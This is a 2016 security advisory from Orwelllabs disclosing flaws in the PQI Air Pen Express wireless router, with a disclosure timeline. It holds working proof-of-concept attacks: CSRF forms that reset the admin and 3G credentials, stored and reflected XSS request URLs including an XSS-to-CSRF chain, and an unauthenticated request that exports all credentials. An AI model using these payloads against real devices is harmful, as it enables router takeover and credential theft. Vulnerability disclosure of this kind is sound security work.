@@ -1,0 +1,231 @@
+                         _ _ _       _
+                        | | | |     | |
+  ___  _ ____      _____| | | | __ _| |__  ___
+ / _ \| '__\ \ /\ / / _ \ | | |/ _` | '_ \/ __|   	
+| (_) | |   \ V  V /  __/ | | | (_| | |_) \__ \
+ \___/|_|    \_/\_/ \___|_|_|_|\__,_|_.__/|___/
+		
+		Security Adivisory
+		   2016-04-03
+		www.orwelllabs.com
+		Twitter:@orwelllabs
+
+				magicword: d0ubl3th1nk1ng...
+
+
+Overview
+=======
+Technical Risk: high
+Likelihood of Exploitation: medium
+Vendor: PQI Group
+Affected Products: PQI Air Pen Express - Wireless Router 6W51-0000R2 and
+6W51-0000R2XXX
+Credits: Discovered and researched by Orwelllabs
+Adivisory URL:
+http://www.orwelllabs.com/2016/04/pqi-air-pen-express-wireless-router.html
+
+
+Issues
+=====
+I. Multiple Cross-Site Request Forgery (CSRF) (CWE-352)
+II. Multiple Stored Cross-site Scripting (CWE-79)
+III. Multiple Reflected Cross-Site Scripting (CWE-79)
+IV. Insecure Direct Request
+V. Insecure Default Permissions (CWE-276)
+VI. No SSL
+
+
+background
+=========
+The smart lipstick-shaped PQI Air Pen express is the world's smallest
+wireless router/access point combo you can get today.
+PQI Air Pen express can be powered via an external adapter or a powered USB
+port on your computer and provide a excellent wireless expreience for
+everyone.
+
+
+I. Cross-Site Request Forgery (CSRF) (CWE-352)
+```````````````````````````````````````````````````````````````````````
+If a user visits a page bellow, this will set the administrative credential
+for PQI Air Pen express to "root:r00t"
+
+<html>
+<!-- CSRF PoC -->
+<body>
+<form action="http://{airpenXweb}/goform/setSysAdm" method="POST">
+<input type="hidden" name="admuser" value="root" />
+<input type="hidden" name="admpass" value="r00t" />
+<input type="submit" value="Submit form" />
+</form>
+</body>
+</html>
+
+
+The attacker can also abuse of the multiple XSS in this device to exploit
+this vulnerability, something like this to set the same cred 'root:r00t'
+
+http://
+{airpenXweb}/goform/setWizard?connectionType=DHCP&ssid=%3Cscript%20src=%22
+http://airpenXweb/goform/setSysAdm?admuser=root&admpass=r00t%22%3E%3C/script%3E%3C!--
+
+
+The following poc will set the credential to access point to "3groot:3g00t"
+(and of course, any other value could be set in this way.)
+
+<html>
+<!-- CSRF PoC2 -->
+<body>
+<form action="http://{airpenXweb}/goform/setWan" method="POST">
+<input type="hidden" name="connectionType" value="DHCP" />
+<input type="hidden" name="staticIp" value="xxx&#46;xxx&#46;xxx&#46;xxx" />
+<input type="hidden" name="staticNetmask" value="255&#46;255&#46;255&#46;0"
+/>
+<input type="hidden" name="staticGateway"
+value="xxx&#46;xxx&#46;xxx&#46;xxx" />
+<input type="hidden" name="staticPriDns" value="xxx&#46;xxx&#46;xxx&#46;x"
+/>
+<input type="hidden" name="staticSecDns" value="xxx&#46;xxx&#46;xxx&#46;x"
+/>
+<input type="hidden" name="hostname" value="" />
+<input type="hidden" name="pppoeUser" value="pppoe&#95;user" />
+
+<input type="hidden" name="pppoePass" value="pppoe&#95;passwd" />
+<input type="hidden" name="pppoePass2" value="pppoe&#95;passwd" />
+<input type="hidden" name="pppoeOPMode" value="KeepAlive" />
+<input type="hidden" name="pppoeRedialPeriod" value="60" />
+<input type="hidden" name="pppoeIdleTime" value="5" />
+<input type="hidden" name="l2tpServer" value="l2tp&#95;server" />
+<input type="hidden" name="l2tpUser" value="l2tp&#95;user" />
+<input type="hidden" name="l2tpPass" value="l2tp&#95;passwd" />
+<input type="hidden" name="l2tpMode" value="0" />
+<input type="hidden" name="l2tpIp" value="192&#46;168&#46;1&#46;1" />
+<input type="hidden" name="l2tpNetmask" value="255&#46;255&#46;255&#46;0"
+/>
+<input type="hidden" name="l2tpGateway" value="192&#46;168&#46;1&#46;254"
+/>
+<input type="hidden" name="l2tpOPMode" value="KeepAlive" />
+<input type="hidden" name="l2tpRedialPeriod" value="60" />
+<input type="hidden" name="pptpServer" value="pptp&#95;server" />
+<input type="hidden" name="pptpUser" value="pptp&#95;user" />
+<input type="hidden" name="pptpPass" value="pptp&#95;passwd" />
+<input type="hidden" name="pptpMode" value="0" />
+<input type="hidden" name="pptpIp" value="192&#46;168&#46;1&#46;1" />
+<input type="hidden" name="pptpNetmask" value="255&#46;255&#46;255&#46;0"
+/>
+<input type="hidden" name="pptpGateway" value="192&#46;168&#46;1&#46;254"
+/>
+<input type="hidden" name="pptpOPMode" value="KeepAlive" />
+<input type="hidden" name="pptpRedialPeriod" value="60" />
+<input type="hidden" name="APN3G" value="" />
+<input type="hidden" name="PIN3G" value="" />
+<input type="hidden" name="Dial3G" value="" />
+<input type="hidden" name="User3G" value="3groot" />               < -- 3G
+User
+<input type="hidden" name="Password3G" value="3gr00t" />      <--  3G
+Password
+<input type="hidden" name="Dev3G" value="Auto" />
+<input type="hidden" name="macCloneEnbl" value="0" />
+<input type="hidden" name="macCloneMac" value="" />
+<input type="submit" value="Submit form" />
+</form>
+</body>
+</html>
+
+
+II. Stored Cross-site Scripting (CWE-79)
+``````````````````````````````````````````````````````````
+"Wide Area Network (WAN) Settings"
+
+# PocParameter: "hostname"
+http://{airpenXweb}/goform/setWan?connectionType=DHCP&staticIp=xxx.xxx.xxx.xxx&staticNetmask=255.255.255.0&staticGateway=&staticPriDns=&staticSecDns=xxx.xxx.xxx.xxx&hostname=[
+* STOREDXSS
+*]&pppoeUser=pppoe_user&pppoePass=pppoe_passwd&pppoePass2=pppoe_passwd&pppoeOPMode=KeepAlive&pppoeRedialPeriod=60&pppoeIdleTime=5&l2tpServer=l2tp_server&l2tpUser=l2tp_user&l2tpPass=l2tp_passwd&l2tpMode=0&l2tpIp=192.168.1.1&l2tpNetmask=255.255.255.0&l2tpGateway=192.168.1.254&l2tpOPMode=KeepAlive&l2tpRedialPeriod=60&pptpServer=pptp_server&pptpUser=pptp_user&pptpPass=pptp_passwd&pptpMode=0&pptpIp=192.168.1.1&pptpNetmask=255.255.255.0&pptpGateway=192.168.1.254&pptpOPMode=KeepAlive&pptpRedialPeriod=60&APN3G=&PIN3G=&Dial3G=&User3G=&Password3G=&Dev3G=Auto&macCloneEnbl=0&macCloneMac=
+
+
+"Webs URL Filter Settings"
+
+# PocParameter: "addURLFilter"
+http://{airpenXweb}/goform/websURLFilter?addURLFilter=[ *STOREDXSS*
+]&addwebsurlfilter=Add
+
+Request in this page will show a pop-up with a content of javascript
+payload:
+http://{airpenXweb}/firewall/content_filtering.asp
+
+# Parameter: "addHostFilter"
+http://{airpenXweb}/goform/websHostFilter?addHostFilter=[ *STOREDXSS*
+]&addwebscontentfilter=Add
+
+
+III. Reflected Cross-Site Scripting (CWE-79)
+``````````````````````````````````````````````````````````````
+Virtually all application inputs are vulnerable to cross-site scripting,
+since it is not carried out any validation of the data provided by the
+user.
+Bellow are some examples:
+
+
+"Basic Wireless Settings"
+
+# PocParameter: "mssid_0"
+http://{airpenXweb}/goform/wirelessBasic?radiohiddenButton=2&wifihiddenButton=2&wirelessmode=9&bssid_num=1&mssid_0=[*
+XSS *
+]&mssid_1=&mssid_2=&mssid_3=&mssid_4=&mssid_5=&mssid_6=&mssid_8=&mssid_9=&mssid_10=&mssid_11=&mssid_12=&mssid_13=&mssid_14=&mssid_15=&broadcastssid=1&apisolated=0&mbssidapisolated=0&sz11gChannel=1&n_mode=0&n_bandwidth=1&n_gi=1&n_mcs=33&n_rdg=1&n_extcha=1&n_stbc=1&n_amsdu=0&n_autoba=1&n_badecline=0&n_disallow_tkip=1&n_2040_coexit=1&tx_stream=1&rx_stream=1
+
+# PocParameter: "ssid"
+http://{airpenXweb}/goform/setWizard?connectionType=DHCP&ssid=[ * XSS *
+]&security_mode=Disable&wzsecureAlgorithm=AES
+
+# PocParameter: "hostname"
+http://{airpenXweb}/goform/setWan?connectionType=[ -*- XSS
+-*-]&staticIp=xxx.xxx.xxx.xxx&staticNetmask=255.255.255.0&staticGateway=xxx.xxx.xxx.xxx&staticPriDns=xxx.xxx.xxx.xxx5&staticSecDns=203.185.0.36&hostname=tiat&pppoeUser=pppoe_user&pppoePass=pppoe_passwd&pppoePass2=pppoe_passwd&pppoeOPMode=KeepAlive&pppoeRedialPeriod=60&pppoeIdleTime=5&l2tpServer=l2tp_server&l2tpUser=l2tp_user&l2tpPass=l2tp_passwd&l2tpMode=0&l2tpIp=192.168.1.1&l2tpNetmask=255.255.255.0&l2tpGateway=192.168.1.254&l2tpOPMode=KeepAlive&l2tpRedialPeriod=60&pptpServer=pptp_server&pptpUser=pptp_user&pptpPass=pptp_passwd&pptpMode=0&pptpIp=192.168.1.1&pptpNetmask=255.255.255.0&pptpGateway=192.168.1.254&pptpOPMode=KeepAlive&pptpRedialPeriod=60&APN3G=&PIN3G=&Dial3G=&User3G=%3Cscript%3Ealert%281%29%3C/script%3E&Password3G=&Dev3G=Auto&macCloneEnbl=0&macCloneMac=
+
+# Parameter: "admpass"
+http://{airpenXweb}/goform/setSysAdm?admuser=root&admpass=[ -*- XSS -*- ]
+
+IV. Insecure Direct Request
+````````````````````````````````````````
+This device allows remote attackers to obtain sensitive information,
+including all credentials available via direct request to
+/cgi-bin/ExportSettings.sh.
+
+PoC:
+http://{airpenXweb}/cgi-bin/ExportSettings.sh
+
+V. Insecure Default Permissions (CWE-276)
+``````````````````````````````````````````````````````````````
+In the device description (on the Vendor's site) it is very clear that the
+priority is to
+facilitate everything for you, including setting. Therefore it is not
+mandatory that a password
+is configured for the web interface and not to connect to the AP, this way
+you can find hundreds
+of these completely unprotected APs.
+
+VI. No SSL
+``````````````````
+Any action, whether sensitive or not is transmitted in plain text because
+HTTPS is not used and no step.
+
+POST /goform/setSysAdm HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101
+Firefox/44.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://xxx.xxx.xxx.xxx/adm/management.asp
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+admuser=ORWL_user&admpass=ORWL_pass
+
+Timeline
+=======
+2015-10-25 - Issues discovered
+2015-11-04 - Vendor contacted
+2015-12-12 - Another attempt to contact the Vendor...
+2016-02-26 - Public Disclosure
+* There is no easy way to contact the vendor. Emails sent remain unanswered
+and forms site contacts as well.
